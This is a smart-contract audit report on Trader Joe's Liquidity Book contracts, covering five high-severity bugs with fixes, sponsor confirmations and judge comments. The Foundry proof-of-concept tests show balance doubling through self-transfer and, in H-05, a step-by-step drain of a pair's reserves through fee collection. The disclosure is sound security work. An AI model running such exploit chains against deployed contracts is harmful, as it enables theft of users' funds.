[H-01] Transfering funds to yourself increases your balance
Submitted byDravee, also found bybitbopper,hansfriese,saian,Tutturu,JMukesh,__141345__,neumo,parashar,Randyyy,phaze,hxzy,Lambda,cccz,SEVEN,ne0n,8olidity, andRaoulSchaffranek
https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192
Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that_toBalancecan overwrite_fromBalance:
File:LBToken.sol176:function_transfer(177:address_from,178:address_to,179:uint256_id,180:uint256_amount181:     )internalvirtual{182:uint256_fromBalance=_balances[_id][_from];...187:uint256_toBalance=_balances[_id][_to];188:189:unchecked{190:_balances[_id][_from] =_fromBalance-_amount;191:_balances[_id][_to] =_toBalance+_amount;//@audit : if _from == _to : rekt192:         }..196:     }
Furthermore, thesafeTransferFromfunction has thecheckApprovalmodifier which passes without any limit if_owner == _spender:
File:LBToken.sol32:modifiercheckApproval(address_from,address_spender) {33:if(!_isApprovedForAll(_from,_spender))revertLBToken__SpenderNotApproved(_from,_spender);34:_;35:     }...131:functionsafeTransferFrom(...136:     )publicvirtualoverridecheckAddresses(_from,_to)checkApproval(_from, msg.sender) {...269:function_isApprovedForAll(address_owner,address_spender)internalviewvirtualreturns(bool) {270:return_owner==_spender||_spenderApprovals[_owner][_spender];271:     }
Proof of Concept
Add the following test toLBToken.t.sol(run it withforge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv):
functiontestSafeTransferFromOneself()public{uint256amountIn=1e18;(uint256[]memory_ids, , , ) =addLiquidity(amountIn,ID_ONE,5,0);uint256initialBalance=pair.balanceOf(DEV,_ids[0]);assertEq(initialBalance,333333333333333333);// using hardcoded value to ease understandingpair.safeTransferFrom(DEV,DEV,_ids[0],initialBalance);//transfering to oneselfuint256rektBalance1=pair.balanceOf(DEV,_ids[0]);//computing new balanceassertEq(rektBalance1,2*initialBalance);// the new balance is twice the initial oneassertEq(rektBalance1,666666666666666666);// using hardcoded value to ease understanding}
As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it’s passing. This can be repeated again and again to increase your balance.
Recommended Mitigation Steps
Add checks to make sure that_from != _tobecause that shouldn’t be useful anywayPrefer the following:
File:LBToken.sol189:unchecked{190:_balances[_id][_from] -=_amount;191:_balances[_id][_to] +=_amount;192:         }
0x0Louis (Trader Joe) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.

[H-02] Incorrect output amount calculation for Trader Joe V1 pools
Submitted byJeiwan, also found byKIntern_NAandcccz
https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896
Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools.
Proof of Concept
LBRouteris a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions:
swapExactTokensForTokensSupportingFeeOnTransferTokens, which makes chained swaps (i.e. swaps between tokens that don’t have a pair) of tokens implementing fee on transfer (i.e. there’s fee reduced from every transferred amount);swapExactTokensForAVAXSupportingFeeOnTransferTokens, which is the variation of the above function which takes AVAX as the output token;swapExactAVAXForTokensSupportingFeeOnTransferTokens, which is the variation of the previous function which takes AVA as the input token.
Under the hood, these three functions call_swapSupportingFeeOnTransferTokens, which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when_binStepis 0 (which is never true in V2 pools), it’s assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools’ reserves and balances:
if(_binStep==0) {(uint256_reserve0,uint256_reserve1, ) =IJoePair(_pair).getReserves();if(_token<_tokenNext) {uint256_balance=_token.balanceOf(_pair);uint256_amountOut= (_reserve1* (_balance-_reserve0) *997) / (_balance*1_000);IJoePair(_pair).swap(0,_amountOut,_recipient,"");}else{uint256_balance=_token.balanceOf(_pair);uint256_amountOut= (_reserve0* (_balance-_reserve1) *997) / (_balance*1_000);IJoePair(_pair).swap(_amountOut,0,_recipient,"");}}else{ILBPair(_pair).swap(_tokenNext==ILBPair(_pair).tokenY(),_recipient);}
However, these calculations are incorrect. Here’s the difference:
@@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {(uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();if (_token < _tokenNext) {uint256 _balance = _token.balanceOf(_pair);-                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);+                        uint256 amountInWithFee = (_balance - _reserve0) * 997;+                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);IJoePair(_pair).swap(0, _amountOut, _recipient, "");} else {uint256 _balance = _token.balanceOf(_pair);-                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);+                        uint256 amountInWithFee = (_balance - _reserve1) * 997;+                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);IJoePair(_pair).swap(_amountOut, 0, _recipient, "");}
These calculations are implemented correctly inJoeLibrary.getAmountOut, which is used inLBQuoter.  Also it’s used in Trader Joe V1 to calculate output amounts in similar functions:
https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375
// test/audit/RouterMath2.t.sol// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.7;import"../TestHelper.sol";import"../../src/LBRouter.sol";import"../../src/interfaces/IJoePair.sol";contractRouterMath2TestisTestHelper{IERC20internaltoken;uint256internalactualAmountOut;functionsetUp()public{token=newERC20MockDecimals(18);ERC20MockDecimals(address(token)).mint(address(this),100e18);router=newLBRouter(ILBFactory(address(0x00)),IJoeFactory(address(this)),IWAVAX(address(0x02)));}// Imitates V1 factory.functiongetPair(address,/*tokenX*/address/*tokenY*/)publicviewreturns(address) {returnaddress(this);}// Imitates V1 pool.functiongetReserves()publicpurereturns(uint112,uint112,uint32) {return(1e18,1e18,0);}// Imitates V1 pool.functionbalanceOf(address/*acc*/)publicpurereturns(uint256) {return0.0001e18;}// Imitates V1 pool.functionswap(uint256amount0,uint256amount1,addressto,bytesmemorydata)public{actualAmountOut=amount0==0?amount1:amount0;}functiontestScenario()public{// Setting up a swap via one V1 pool.uint256[]memorysteps=newuint256[](1);steps[0] =0;IERC20[]memorypath=newIERC20[](2);path[0] =IERC20(address(token));path[1] =IERC20(address(this));uint256amountIn=0.0001e18;token.approve(address(router),1e18);router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn,0,steps,path,address(this),block.timestamp+1000);// This amount was calculated incorrectly.assertEq(actualAmountOut,987030000000000000);// Equals to 989970211528238869 when fixed.address_pair=address(this);uint256expectedAmountOut;// Reproduce the calculations using JoeLibrary.getAmountIn. This piece:(uint256_reserve0,uint256_reserve1, ) =IJoePair(_pair).getReserves();if(address(token) <address(this)) {uint256_balance=token.balanceOf(_pair);expectedAmountOut=JoeLibrary.getAmountOut(_balance-_reserve0,_reserve0,_reserve1);}else{uint256_balance=token.balanceOf(_pair);expectedAmountOut=JoeLibrary.getAmountOut(_balance-_reserve1,_reserve1,_reserve0);}// This is the correct amount.assertEq(expectedAmountOut,989970211528238869);// The wrong amount is smaller than the expected one.assertEq(expectedAmountOut-actualAmountOut,2940211528238869);}}
Recommended Mitigation Steps
Consider using theJoeLibrary.getAmountOutfunction in the_swapSupportingFeeOnTransferTokensfunction ofLBRouterwhen computing output amounts for V1 pools.
0x0Louis (Trader Joe) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, due to incorrect calculations, swaps routed through V1 functions may cause losses to end users.Because the issue is with a core mechanism of the protocol, and the warden has shown (via coded POC) how a loss can happen, I agree with High Severity.While this finding is similar to H-01, at this time I think it’s different enough to keep it separate as the internals and code paths are distinct.

[H-03] Wrong implementation of functionLBPair.setFeeParametercan break the funcionality of LBPair and make user’s tokens locked
Submitted byKIntern_NA, also found byTrustandKingNFT
StructFeeParameterscontains 12 fields as follows:
structFeeParameters{// 144 lowest bits in slotuint16binStep;uint16baseFactor;uint16filterPeriod;uint16decayPeriod;uint16reductionFactor;uint24variableFeeControl;uint16protocolShare;uint24maxVolatilityAccumulated;// 112 highest bits in slotuint24volatilityAccumulated;uint24volatilityReference;uint24indexRef;uint40time;}
FunctionLBPair.setFeeParamters(bytes _packedFeeParamters)is used to set the first 8 fields which was stored in 144 lowest bits ofLBPair._feeParameter’s slot to 144 lowest bits of_packedFeeParameters(The layout of_packedFeeParameterscan be seenhere).
/// @notice Internal function to set the fee parameters of the pair/// @param _packedFeeParameters The packed fee parametersfunction_setFeesParameters(bytes32_packedFeeParameters)internal{bytes32_feeStorageSlot;assembly{_feeStorageSlot :=sload(_feeParameters.slot)}/// [#explain]  it will get 112 highest bits of feeStorageSlot,///             and stores it in the 112 lowest bits of _varParametersuint256_varParameters=_feeStorageSlot.decode(type(uint112).max,_OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);/// [#explain]  get 144 lowest bits of packedFeeParameters///             and stores it in the 144 lowest bits of _newFeeParametersuint256_newFeeParameters=_packedFeeParameters.decode(type(uint144).max,0);assembly{// [$audit-high] wrong operation `or` here//              Mitigate: or(_newFeeParameters, _varParameters << 144)sstore(_feeParameters.slot,or(_newFeeParameters,_varParameters))}}
As we can see in the implementation ofLBPair._setFeesParametesabove, it gets the 112 highest bits of_feeStorageSlotand stores it in the 112 lowest bits of_varParameter. Then it gets the 144 lowest bits ofpackedFeeParameterand stores it in the 144 lowest bits of_newFeeParameters.
Following the purpose of functionsetFeeParameters, the newLBPair._feeParametersshould form as follow:
// keep 112 highest bits remain unchanged// set 144 lowest bits to `_newFeeParameter`[...112 bits...][....144 bits.....][_varParameters][_newFeeParameters]
It will makefeeParameters = _newFeeParameters | (_varParameters << 144). But current implementation just stores theorvalue of_varParametersand_newFeeParameterinto_feeParameters.slot. It forgot to shift left the_varParameters144 bits before executingoroperation.
This will make the value ofbinStep, …,maxVolatilityAccumulatedincorrect, and also remove the value (make the bit equal to 0) ofvolatilityAccumulated, …,time.
Impact
Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint)Break the functionality of LBPair. The user can’t swap/mint/flashLoan
--> Make all the tokens stuck in the pools
Proof of concept
Here is our test script to describe the impacts
https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769
You can place this file into/testfolder and run it using
forge test --match-contract High1Test -vv
Explanation of test script:
First we create a pair withbinStep = DEFAULT_BIN_STEP = 25We do some actions (add liquidity -> mint -> swap) to increase the value ofvolatilityAccumulatedfrom0to60000We call functionfactory.setFeeParametersOnPairto set new fee parameters.After that the value ofvolatilityAccumulatedchanged to value0(It should still be unchanged afterfactory.setFeeParametersOnPair)We check the value ofbinStepand it changed from25to60025binStephas that value becauseline 915setbinStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025.This change ofbinStepvalue will break all the functionality ofLBPaircausebinStep > Constant.BASIS_POINT_MAX = 10000-->Error: BinStepOverflows
Tools Used
Foundry
Recommended Mitigation Steps
Modify functionLBPair._setFeesParatersas follow:
function_setFeesParameters(bytes32_packedFeeParameters)internal{bytes32_feeStorageSlot;assembly{_feeStorageSlot :=sload(_feeParameters.slot)}uint256_varParameters=_feeStorageSlot.decode(type(uint112).max,_OFFSET_VARIABLE_FEE_PARAMETERS);uint256_newFeeParameters=_packedFeeParameters.decode(type(uint144).max,0);assembly{sstore(_feeParameters.slot,or(_newFeeParameters,shl(144,_varParameters)))}}
0x0Louis (Trader Joe) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, due to a missing shift, packed settings forfeeParameterswill be improperly stored, causing undefined behaviour.The mistake can be trivially fixed and the above code offers a test case for remediation.Because the finding impacts the protocol functionality, despite it’s perceived simplicity, I agree with High Severity as the code is not working as intended in a fundamental way.

[H-04] Wrong calculation in functionLBRouter._getAmountsInmake user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)
Submitted byKIntern_NA, also found byhansfriese,Jeiwan, andcccz
FunctionLBRouter._getAmountsInis a helper function to return the amounts in with givenamountOut. This function will check the pair of_tokenand_tokenNextisJoePairorLBPairusing_binStep.
If_binStep == 0, it will be aJoePairotherwise it will be anLBPair.
if(_binStep==0) {(uint256_reserveIn,uint256_reserveOut, ) =IJoePair(_pair).getReserves();if(_token>_tokenPath[i]) {(_reserveIn,_reserveOut) = (_reserveOut,_reserveIn);}uint256amountOut_=amountsIn[i];// Legacy uniswap way of roundingamountsIn[i-1] = (_reserveIn*amountOut_*1_000) / (_reserveOut-amountOut_*997) +1;}else{(amountsIn[i-1], ) =getSwapIn(ILBPair(_pair),amountsIn[i],ILBPair(_pair).tokenX() ==_token);}
As we can see when_binStep == 0and_token < _tokenPath[i](in another word  we swap throughJoePairand pair’stoken0is_tokenandtoken1is_tokenPath[i]), it will
Get the reserve of pair (reserveIn,reserveOut)Calculate the_amountInby using the formula
amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1
But unfortunately the denominator_reserveOut - amountOut_ * 997seem incorrect. It should be(_reserveOut - amountOut_) * 997.We will do some math calculations here to prove the expression above is wrong.
Input:
_reserveIn (rIn): reserve of_tokenin pair_reserveOut (rOut): reserve of_tokenPath[i]in pairamountOut_: the amount of_tokenPaththe user wants to gain
Output:
rAmountIn: the actual amount of_tokenwe need to transfer to the pair.
Generate Formula:
CauseJoePairtakes 0.3%ofamountInas fee, we get
amountInDeductFee = amountIn' * 0.997
Following theconstant product formula, we have
rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_)==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1<=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1<=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1<=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1<=>
As we can seerAmountInis different fromamountsIn[i - 1], the denominator ofrAmountInis(rOut - amountOut_) * 997when the denominator ofamountsIn[i - 1]is_reserveOut - amountOut_ * 997(Missing one bracket)
Impact
Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.
Let dive in the functionswapTokensForExactTokens()to figure out why this scenario happens. I will assume I just swap through only one pool fromJoePairand 0 pool fromLBPair.
Firstly function will get the listamountsInfrom function_getAmountsIn. SoamountsInwill be [incorrectAmountIn,userDesireAmount].amountsIn=_getAmountsIn(_pairBinSteps,_pairs,_tokenPath,_amountOut);Then it transfersincorrectAmountInto_pairs[0]to prepare for the swap._tokenPath[0].safeTransferFrom(msg.sender,_pairs[0],amountsIn[0]);Finally it calls function_swapTokensForExactTokento execute the swap.uint256_amountOutReal=_swapTokensForExactTokens(_pairs,_pairBinSteps,_tokenPath,amountsIn,_to);In this step it will reach toline 841which will set the expectedamountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount.amountOut=_amountsIn[i+1];So after callingIJoePair(_pair).swap(), the user just gets exactlyamountOutand wastes a lot of tokenIn that (s)he transfers to the pool.
Proof of concept
Here is our test script to describe the impacts
https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4
You can place this file into/testfolder and run it using
forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv
Explanation of test script: (For more detail you can read the comments from test script above)
Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory.At the forked block, priceWAVAX/USDCwas around 15.57. We try to use LBRouter functionswapTokensForExactTokensto swap10$WAVAX (10e18 wei) to1$USDC (1e6 wei). But it reverts with the errorLBRouter__MaxAmountInExceeded. But when we swap directly to JoePair, it swap successfully10$AVAX (10e18 wei) to155$USDC (155e6 wei).We use LBRouter functionswapTokensForExactTokensagain with very largeamountInMaxto swap1$USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).
Tools Used
Foundry
Recommended Mitigation Steps
Modify functionLBRouter._getAmountsInas follow
if(_binStep==0) {(uint256_reserveIn,uint256_reserveOut, ) =IJoePair(_pair).getReserves();if(_token>_tokenPath[i]) {(_reserveIn,_reserveOut) = (_reserveOut,_reserveIn);}uint256amountOut_=amountsIn[i];// Legacy uniswap way of rounding// Fix hereamountsIn[i-1] = (_reserveIn*amountOut_*1_000) / ((_reserveOut-amountOut_) *997) +1;}else{(amountsIn[i-1], ) =getSwapIn(ILBPair(_pair),amountsIn[i],ILBPair(_pair).tokenX() ==_token);}
0x0Louis (Trader Joe) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, due to an incorrect order of operation, the math for the router will be incorrect.While the error could be considered a typo, the router is the designated proper way of performing a swap, and due to this finding, the math will be off.Because the impact shows an incorrect logic, and a broken invariant (the router uses incorrect amounts, sometimes reverting, sometimes costing the end user more tokens than necessary), I believe High Severity to be appropriate.Mitigation will require refactoring and may be aided by the test case offered in this report.

[H-05] Attacker can steal entire reserves by abusing fee calculation
Submitted byTrust, also found byzzykxx
https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202
Similar to other LP pools, In Trader Joe users can callmint()to provide liquidity and receive LP tokens, andburn()to return their LP tokens in exchange for underlying assets. Users collect fees usingcollectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:
function _getPendingFees(Bin memory _bin,address _account,uint256 _id,uint256 _balance) private view returns (uint256 amountX, uint256 amountY) {Debts memory _debts = _accruedDebts[_account][_id];amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;}
accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.
When liquidity is first minted to user, the _accruedDebts is updated to match current _balance * accToken*PerShare. Without this step, user could collect fees for the entire growth of accToken*PerShare from zero to current value. This is done in _updateUserDebts, called by _cacheFees() which is called by _beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.
function _updateUserDebts(Bin memory _bin,address _account,uint256 _id,uint256 _balance) private {uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);_accruedDebts[_account][_id].debtX = _debtX;_accruedDebts[_account][_id].debtY = _debtY;}
The critical problem lies in _beforeTokenTransfer:
if (_from != _to) {if (_from != address(0) && _from != address(this)) {uint256 _balanceFrom = balanceOf(_from, _id);_cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);}if (_to != address(0) && _to != address(this)) {uint256 _balanceTo = balanceOf(_to, _id);_cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);}}
Note that if _from or _to is the LBPair contract itself, _cacheFees won’t be called on _from or _to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.
This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token’s fees from 0 to current accToken*PerShare value.
We can exploit this bug to collect the entire reserve assets. The attack flow is:
Transfer amount X to pairCallpair.mint(), with the to address = pair addresscallcollectFees()with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not workPair will now think user sent in money, because the bookkeeping is wrong. _pairInformation.feesX.total is decremented incollectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:
uint256 _amountIn = _swapForY? tokenX.received(_pair.reserveX, _pair.feesX.total): tokenY.received(_pair.reserveY, _pair.feesY.total);
Attacker callsswap()and receives reserve assets using the fees collected.Attacker callsburn(), passing their own address in _to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.
Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:
if (amountX != 0) {_pairInformation.feesX.total -= uint128(amountX);}if (amountY != 0) {_pairInformation.feesY.total -= uint128(amountY);}
If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.
Impact
Attacker can steal the entire reserves of the LBPair.
Proof of Concept
Paste this test in LBPair.Fees.t.sol:
function testAttackerStealsReserve() public {uint256 amountY=  53333333333333331968;uint256 amountX = 100000;uint256 amountYInLiquidity = 100e18;uint256 totalFeesFromGetSwapX;uint256 totalFeesFromGetSwapY;addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);uint256 id;(,,id ) = pair.getReservesAndId();console.log("id before" , id);//swap X -> Y and accrue X fees(uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);totalFeesFromGetSwapX += feesXFromGetSwap;token6D.mint(address(pair), amountXInForSwap);vm.prank(ALICE);pair.swap(true, DEV);(uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();(,,id ) = pair.getReservesAndId();console.log("id after" , id);console.log("Bob balance:");console.log(token6D.balanceOf(BOB));console.log(token18D.balanceOf(BOB));console.log("-------------");uint256 amount0In = 100e18;uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);console.log("Minting for BOB:");console.log(amount0In);console.log("-------------");token6D.mint(address(pair), amount0In);//token18D.mint(address(pair), amount1In);pair.mint(_ids, _distributionX, _distributionY, address(pair));uint256[] memory amounts = new uint256[](1);console.log("***");for (uint256 i; i < 1; i++) {amounts[i] = pair.balanceOf(address(pair), _ids[i]);console.log(amounts[i]);}uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;(uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);console.log("profit x", profit_X);console.log("profit y", profit_Y);pair.collectFees(address(pair), profit_ids);(uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);console.log("swap x", swap_x);console.log("swap y", swap_y);console.log("Bob balance after swap:");console.log(token6D.balanceOf(BOB));console.log(token18D.balanceOf(BOB));console.log("-------------");console.log("*****");pair.burn(_ids, amounts, BOB);console.log("Bob balance after burn:");console.log(token6D.balanceOf(BOB));console.log(token18D.balanceOf(BOB));console.log("-------------");}
Tools Used
Manual audit, foundry
Recommended Mitigation Steps
Code should not exempt any address from _cacheFees(). Evenaddress(0)is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them.
0x0Louis (Trader Joe) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how to exploit logic paths that would skip fee accrual, to be able to gather more fees than expected.While the finding pertains to a loss of fees, the repeated attack will allow stealing reserves as well, for this reason I agree with High Severity.

